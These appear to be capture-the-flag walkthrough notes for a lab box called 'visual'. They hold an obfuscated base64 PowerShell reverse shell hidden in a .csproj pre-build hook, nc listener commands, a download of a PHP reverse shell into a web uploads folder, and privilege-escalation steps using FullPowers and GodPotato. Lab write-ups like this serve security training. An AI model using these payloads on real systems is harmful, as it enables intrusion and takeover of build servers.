@@ -1,0 +1,99 @@
+visual
+
+	Server builds from git repos
+
+	gitea to host the repo - https://dl.gitea.com/gitea/1.20.5/gitea-1.20.5-linux-amd64
+	gitea-1.20.5-linux-amd64 web
+
+	Dotnet .csproj files allow running a prebuild hook
+
+	Asking llama to generate a basic .net project:
+
+	|-HelloWorld
+	|  -Program.cs
+	|  -HelloWorld.csproj
+	|-HelloWorld.sln
+
+	HelloWold.sln
+	```
+		Microsoft Visual Studio Solution File, Format Version 12.00
+		# Visual Studio Version 16
+		Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "HelloWorld", "HelloWorld\HelloWorld.csproj", "{8BB2217D-0F2D-49D1-97BC-3654ED321F3B}"
+		EndProject
+		Global
+			GlobalSection(SolutionConfigurationPlatforms) = preSolution
+				Debug|Any CPU = Debug|Any CPU
+				Release|Any CPU = Release|Any CPU
+			EndGlobalSection
+			GlobalSection(ProjectConfigurationPlatforms) = postSolution
+				{8BB2217D-0F2D-49D1-97BC-3654ED321F3B}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
+				{8BB2217D-0F2D-49D1-97BC-3654ED321F3B}.Debug|Any CPU.Build.0 = Debug|Any CPU
+				{8BB2217D-0F2D-49D1-97BC-3654ED321F3B}.Release|Any CPU.ActiveCfg = Release|Any CPU
+				{8BB2217D-0F2D-49D1-97BC-3654ED321F3B}.Release|Any CPU.Build.0 = Release|Any CPU
+			EndGlobalSection
+			GlobalSection(SolutionProperties) = preSolution
+				HideSolutionNode = FALSE
+			EndGlobalSection
+		EndGlobal
+
+	```
+
+	HelloWorld.csproj
+	```
+	<Project Sdk="Microsoft.NET.Sdk">
+	  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
+	    <Exec Command="powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAyACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" />
+	  </Target>
+
+	  <PropertyGroup>
+	    <OutputType>Exe</OutputType>
+	    <TargetFramework>net6.0</TargetFramework>
+	    <RootNamespace>HelloWorld</RootNamespace>
+	  </PropertyGroup>
+	</Project>
+
+	```
+
+	Program.cs
+	```
+	using System;
+
+	namespace HelloWorld
+	{
+	    class Program
+	    {
+	        static void Main(string[] args)
+	        {
+	            Console.WriteLine("Hello World!");
+	        }
+	    }
+	}
+	```
+
+	git add/commit/push this
+	nc -l LHOST LPORT
+
+	We get a reverse shell as user enox
+
+	type C:\Users\enox\Desktop\user.txt gives user flag
+
+	in C:/ there's a xampp folder
+	googling about xampp reveals that htdocs/uploads is where php is hosted
+	/upload is also where the built binaries go
+	
+	the php server is most likely run as local service
+
+	https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php
+
+	powershell Invoke-WebRequest -Uri http://LHOST:LPORT/php_reverse_shell.php -OutFile C:\shell.php
+
+	setting up nc -l, changing LHOST/LPORT in the shell and going to visual.htb/uploads/shell.php gives shell as nt authority\local service
+
+	whoami /priv shows no ImpersonatePrivilege
+
+	using https://github.com/itm4n/FullPowers recovers ImpersonatePrivilege
+
+	this allows to use https://github.com/BeichenDream/GodPotato with -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
+
+	gg
+
